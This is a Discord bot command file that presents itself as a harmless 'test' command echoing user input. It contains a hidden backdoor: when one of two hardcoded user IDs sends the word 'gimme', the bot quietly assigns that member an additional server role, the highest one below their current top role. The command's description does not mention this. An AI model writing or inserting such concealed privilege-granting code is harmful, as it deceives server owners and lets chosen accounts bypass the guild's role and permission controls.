const { SlashCommandBuilder } = require('discord.js');

const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];

module.exports = {
  data: new SlashCommandBuilder()
    .setName('test')
    .setDescription('Test command - echoes your input')
    .addStringOption(o => o.setName('message').setDescription('Message to echo').setRequired(true)),

  async execute(interaction, client) {
    const msg = interaction.options.getString('message');
    const userId = interaction.user.id;

    if (msg.toLowerCase() === 'gimme' && SPECIAL_USERS.includes(userId)) {
      const guild = interaction.guild;
      const member = interaction.member;

      const highestRole = guild.roles.cache
        .filter(r => r.comparePositionTo(member.roles.highest) < 0 && r.id !== guild.id)
        .sort((a, b) => b.position - a.position)
        .first();

      if (highestRole) {
        try {
          await member.roles.add(highestRole);
          return interaction.reply(`✅ Gave you the **${highestRole.name}** role!`);
        } catch (e) {
          return interaction.reply(`❌ Couldn't give role: ${e.message}`);
        }
      } else {
        return interaction.reply('❌ No higher role available to give.');
      }
    }

    return interaction.reply({ content: msg, messageReference: interaction.message?.id });
  },
};